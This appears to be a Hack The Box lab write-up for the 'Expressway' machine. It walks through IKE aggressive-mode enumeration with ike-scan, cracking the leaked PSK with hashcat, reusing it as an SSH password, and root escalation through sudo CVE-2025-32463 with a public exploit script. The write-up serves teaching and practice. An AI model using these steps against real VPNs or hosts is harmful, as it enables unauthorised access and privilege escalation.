---
title: "HTB: Expressway"
description: "A Linux Medium with no web surface at all. The whole foothold runs through a VPN service on UDP 500, IKE aggressive mode leaks an identity, and a cracked PSK gets you in."
author: "Chaelsoo"
pubDate: 2026-02-20
draft: false
tags: ["htb", "linux", "vpn"]
---

Expressway is the kind of machine that makes you second-guess your recon. You scan it, get one TCP port, and think you must have missed something. You didn't. There's no web app here, no API, no admin panel to poke at. Just SSH and a VPN service sitting on UDP that most people walk right past.

## Recon

TCP scan first, as always.

```bash
nmap -sV -O MACHINE_IP -T5
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
```

One result: port 22, OpenSSH 10.0. That's it. At this point you either assume the box is broken or you scan UDP.

```bash
nmap -sU -sV MACHINE_IP -T5
```

```
PORT    STATE SERVICE
500/udp open  isakmp
```

Port 500 comes back open: `isakmp`. That's IKE, the key exchange protocol used to set up IPSec VPN tunnels. Not something you see on most boxes.

`TIP:` Always run a UDP scan on HTB boxes, especially when TCP gives you almost nothing. Services like SNMP, TFTP, and IKE only show up there.

## What IKE Actually Is

IKE (Internet Key Exchange) is the handshake protocol behind IPSec VPNs. Before two endpoints can encrypt traffic between them, they need to agree on keys. IKE handles that negotiation on UDP port 500.

There are two negotiation modes: main mode and aggressive mode. Main mode keeps the identities of both parties hidden during the handshake. Aggressive mode skips some of those steps to speed things up, and in doing so, leaks the initiator's identity in cleartext. Worse, it also sends a hash of the pre-shared key (PSK) that can be cracked offline.

Aggressive mode is considered deprecated for exactly this reason, but it still shows up in the wild.

## Getting the Identity

`ike-scan` is a purpose-built tool for probing IKE services. Start with a basic scan to confirm what's running:

```bash
sudo ike-scan MACHINE_IP
```

```
MACHINE_IP     Main Mode Handshake returned
  HDR=(CKY-R=2ad62b0f5e7489c1)
  SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK
      LifeType=Seconds LifeDuration=28800)
  VID=09002689dfd6b712 (XAUTH)
  VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
```

Main mode confirmed, PSK auth. Now try aggressive mode:

```bash
sudo ike-scan --aggressive MACHINE_IP
```

```
MACHINE_IP     Aggressive Mode Handshake returned
  HDR=(CKY-R=6f25465c8c7d0f1f)
  SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK
      LifeType=Seconds LifeDuration=28800)
  KeyExchange(128 bytes)
  Nonce(32 bytes)
  ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
  VID=09002689dfd6b712 (XAUTH)
  VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
  Hash(20 bytes)
```

Right there in the response: `ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)`. The service just handed us a valid username.

## Cracking the PSK

Now that aggressive mode is confirmed and the identity is known, we can extract the PSK hash. `ike-scan` has a `--pskcrack` option that writes the hash to a file:

```bash
ike-scan -M -A MACHINE_IP --pskcrack=output.txt
```

```
MACHINE_IP     Aggressive Mode Handshake returned
  HDR=(CKY-R=2db8f6ce7d1ae9ee)
  SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK
      LifeType=Seconds LifeDuration=28800)
  KeyExchange(128 bytes)
  Nonce(32 bytes)
  ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
  VID=09002689dfd6b712 (XAUTH)
  VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
  Hash(20 bytes)
```

The hash format that comes out is IKEv1 aggressive mode. Hashcat handles it with mode 5400:

```bash
hashcat -m 5400 output.txt /usr/share/wordlists/rockyou.txt
```

Cracked: `freakingrockstarontheroad`.

That's the PSK, but it also turns out to be the SSH password. Makes sense for a box like this where the VPN identity and the system user are the same person.

```bash
ssh ike@expressway.htb
```

Voila, we're in.

## Privelege Escalation

Check sudo version early. It's one of those things that takes two seconds and occasionally pays off big.

```bash
sudo --version
```

`sudo 1.9.17`. That version is vulnerable to CVE-2025-32463, a privilege escalation through the `-R` (chroot) flag. The idea is that `sudo -R` lets you specify a chroot directory, and if you can control what's in that directory, you can make sudo load a malicious NSS library as root.

The exploit creates a fake chroot directory with a crafted `nsswitch.conf` pointing at a malicious shared library. When sudo chroots into it, it loads the library as root, the constructor fires, and you get a shell.

Running the public exploit script:

```bash
bash exploit.sh
```

Root shell lands at `/tmp/poc`. That's it, box done.

## What This Machine Is Really Testing

The whole first half of this box is about not panicking when your TCP scan comes back empty. The instinct is to run more TCP scans, try different flags, assume something is filtered. But the answer was a UDP service the whole time.

IKE aggressive mode is a real-world finding. It shows up in actual VPN assessments fairly often, especially on older Cisco and Juniper gear. The reason it's dangerous is exactly what happened here: a single crafted packet gets you an identity and a crackable hash without authenticating at all.

`TIP:` If you ever run into IKE on a real engagement, `ike-scan` with aggressive mode is your first move. Pair it with a solid wordlist and you'll crack a surprising number of PSKs.
